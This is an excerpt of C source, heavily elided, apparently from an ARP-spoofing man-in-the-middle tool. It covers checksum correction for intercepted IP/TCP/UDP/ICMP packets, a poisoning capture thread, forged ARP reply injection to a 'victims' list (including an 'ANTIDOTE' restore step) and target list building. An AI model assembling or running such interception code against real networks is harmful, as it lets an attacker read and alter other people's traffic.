...
// L1_type=pcap_datalink(pcap_t *p);
    L1_head_len = 14 ;
    L1_len = sz ;
    ...
    case ETH_P_IP:
        //fputc('4',stderr);
        L2_head_len = sizeof(uint32_t) * (0xf & *(uint8_t*)(pkt+L1_head_len));
        L3_type = *(uint8_t*)(pkt+L1_head_len+9);
        L2_len= ntohs(*(uint16_t*)(pkt+L1_head_len+2));
        int i=2;
        chk = htons(*((uint16_t*)(pkt+L1_head_len)));
        while(i<10){
            chk += htons(*((uint16_t*)(pkt+L1_head_len+i)));
            i+=2;
        }
        i+=2;
        while(i<20){
        ...
        while(chk & 0xffff0000){
            chk = ((chk&0xffff) + ((chk & 0xffff0000) >> 16));
        }
        chk = htons(~chk);
        if(*(uint16_t*)(pkt+L1_head_len+10) != chk ){
    ...
    case ETH_P_ARP:
        ...
        crc = crc32(crc, (const unsigned char *)pkt, 60);
        memcpy(pkt+60,&crc,sizeof(unsigned long));
        break;

    default:
        fprintf(stderr,"Unsupported Layer 2 : 0x%04x \n",L2_type);
        // exit(0);
        break;
    }
...
//fprintf(stderr,"T\n");
        i=12;
        chk = htons(*((uint16_t*)(pkt+L1_head_len+i))); //ipsrc1

        i+=2;
        while(i<20){
            chk += htons(*((uint16_t*)(pkt+L1_head_len+i))); //ipsrc2+ipdst1&2
            i+=2;
        }
        chk +=6; //TCP
        i=(L1_head_len+L2_head_len);
        chk += (sz - i);
        while(i<((L1_head_len+L2_head_len+16)))// up to the TCP chksum
        {
            chk += htons(*((uint16_t*)(pkt+i))); //ipsrc2+ipdst1&2
            i+=2;
        }
        i+=2;
        //j = *(msg+(L1_head_len+L2_head_len+12)) >> 4;
        ...
        chk = htons(~chk);
        if(*(uint16_t*)(pkt+(L1_head_len+L2_head_len+16) )!= chk ){
            fprintf(stderr,RED"Correcting tcp chksum %d %x %x\n" RESET  , sz, *(uint16_t*)(pkt+L1_head_len+L2_head_len+16) , chk);
    ...
    case IPPROTO_UDP:
        ...
        i=(L1_head_len+L2_head_len);
        chk += (sz - i);
        while(i<((L1_head_len+L2_head_len+6)))// up to the UDP chksum
        {
            chk += htons(*((uint16_t*)(pkt+i))); //ipsrc2+ipdst1&2
            i+=2;
        }
        ...
        if(sz&1){
            //fprintf(stderr,"\nODD %d %d %x %x\n",sz,i,chk+(*(pkt+i-1)),chk+htons(*(uint16_t*)(pkt+i-1)));
        ...
        chk = htons(~chk);
        if(*(uint16_t*)(pkt+(L1_head_len+L2_head_len+6) )!= chk ){
            fprintf(stderr,RED"Correcting udp chksum %d %x %x\n" RESET  , sz, *(uint16_t*)(pkt+L1_head_len+L2_head_len+16) , chk);
    ...
    case IPPROTO_ICMP:
        //fprintf(stderr,"I\n");
        i=(L1_head_len+L2_head_len);
        chk = htons(*((uint16_t*)(pkt+i))); //icmptype+code
        i+=4; //over the checksum
        while(i<sz){
            chk += htons(*((uint16_t*)(pkt+i))); //ipsrc2+ipdst1&2
            i+=2;
        }
        ...
        chk = htons(~chk);
        if(*(uint16_t*)(pkt+(L1_head_len+L2_head_len+2) )!= chk ){
            fprintf(stderr,RED"Correcting icmp chksum %x %x\n" RESET  , *(uint16_t*)(pkt+L1_head_len+L2_head_len+2) , chk);
            *(uint16_t*)(pkt+L1_head_len+L2_head_len+2)= chk;
        }

        break;
    default:
        fprintf(stderr,"Unsupported Layer 3 %x \n",L3_type );
        // exit(0);
        break;
    }
    fputc('\n',stderr);
...
void * start_asyncpoisoncap(void * argptr)
{
  ...
  if(ret < 0 ){
      if(ret == -2)
          printf("loop asyncp exited with break\n");
      else
          printf("loop asyncp err %d %s\n",ret,pcap_geterr(pcap_device_infos.handle));
  }else{
    printf("whut ?? %d %s\n",ret,pcap_geterr(pcap_device_infos.handle));
  }
  printf("loop asyncp out");
    ...
    * (short*) (buffer+ARP_OFF_OPCODE) = htons(0x2);
    ...
    while(curr_ip_list!=NULL){
        if(curr_ip_list->is_target){
            ...
            printf(GREEN"%s"RESET" is given ANTIDOTE\n", victims_ip_list[i]->ip4_string);
            i++;
        }
        curr_ip_list=curr_ip_list->next;
    }
    ...
    for(i=0;i<num_victims;i++){
        memcpy(buffer+ARP_OFF_LOCALMAC1,&victims_ip_list[i]->mac_addr,6);
        memcpy(buffer+ARP_OFF_SENDERMAC2,&victims_ip_list[i]->mac_addr,6);
        memcpy(buffer+ARP_OFF_SENDERIP,&victims_ip_list[i]->ip4_n,4);
        for(j=0;j<num_victims;j++){
            if(i!=j){
                memcpy(buffer+ARP_OFF_TARGMAC0,&victims_ip_list[j]->mac_addr,6);
                memcpy(buffer+ARP_OFF_TARGMAC ,&victims_ip_list[j]->mac_addr,6);
                memcpy(buffer+ARP_OFF_TARGIP ,&victims_ip_list[j]->ip4_n,4);
                crc = crc32(0, Z_NULL, 0);
                ...
                {
                    pcap_perror(pcap_device_infos.handle,"INJECTING: ANTIDOTE");
                }
            }
        }
    }
...
//  memcpy(buffer,arp_structure_raw,sizeof(arp_structure_raw));
  ...
  * (short*) (buffer+ARP_OFF_OPCODE) = htons(0x2);
  ...
  while(global_params.poisonning){
    ...
    usleep((global_params.timeout_millis/2)*1000);
  }
  return NULL;
}
...
void arping_callback(u_char *user,const struct pcap_pkthdr* pkthdr,const u_char* packet)
{
  ...
  if(   *((short*)(packet+ARP_OFF_PKTYPE)) == 0x0608 &&
    ...
    if(curr_ip_list->arp_received==0)
...
void make_ip_list() {
  ...
  if(global_params.destinations_cnt > 1){
      // sparse list
      start = 0;
      while( start < global_params.destinations_cnt){
          curr_ip_list->next = (IP4_arp_state_t*) calloc(1,sizeof(IP4_arp_state_t));
          curr_ip_list->next->prev = curr_ip_list;
          curr_ip_list=curr_ip_list->next;
          inet_pton(AF_INET,global_params.destination_ips[start],&(curr_ip_list->ip4_n));
          curr_ip_list->ip4_h = ntohl(curr_ip_list->ip4_n);
          curr_ip_list->ip4_string = (char*) calloc (16,sizeof(char));
          strncpy(curr_ip_list->ip4_string,global_params.destination_ips[start],strlen(global_params.destination_ips[start]));
          start++;
      }
  } else {
      //compact list
